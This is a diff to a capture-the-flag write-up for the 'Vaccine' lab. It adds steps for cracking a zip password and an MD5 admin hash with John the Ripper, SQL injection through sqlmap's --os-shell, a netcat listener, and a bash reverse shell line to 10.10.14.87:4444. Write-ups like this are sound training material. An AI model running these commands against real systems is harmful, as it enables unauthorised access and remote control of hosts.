@@ -28,6 +28,9 @@ After that I try to unzip it but the problem is Password is needed.
 
 ![unzip0](/assets/img/Vaccine/unzip0.png)
 
+
+## **Credential Access**
+
 To make **johntheripper** able to read and crack the password we need **zip2john**.
 
 ![zip2john](/assets/img/Vaccine/zip2john.png)
@@ -62,6 +65,10 @@ Get the result by indicate MD5 format: ```john --show --format=raw-md5 admin.txt
 The password is **qwerty789**
 ![admin.txt](/assets/img/Vaccine/qwerty.png)
 
+
+## **Exploitation**
+
+
 I use that thing to get in to admin's dashboard page. They have search function and its not sanitize input. So, Its vulnerable to **SQL injection(SQLi)** .
 For example, They throw an error when we put a single quote.
 
@@ -77,12 +84,18 @@ But before we continue i have to open my listener :
 ```nc -lvnp 4444 ```
 ![listener](/assets/img/Vaccine/listener.png)
 
-
+use ```--os-shell ``` to RCE on target.
 ![sqlmap](/assets/img/Vaccine/sqlmap.png)
+![sqlmap2](/assets/img/Vaccine/sqlmap2.png)
+
+After trying SQLi, I can now successfully execute a bash reverse shell.
+```bash -c 'bash -i >& /dev/tcp/10.10.14.87/4444 0>&1' ```
+
+user flag can be found at ```/var/lib/postgresql ```
+![flag2](/assets/img/Vaccine/userflag2.png)
 
 
-
-
+## **Privilege Escalation**
 
 
 
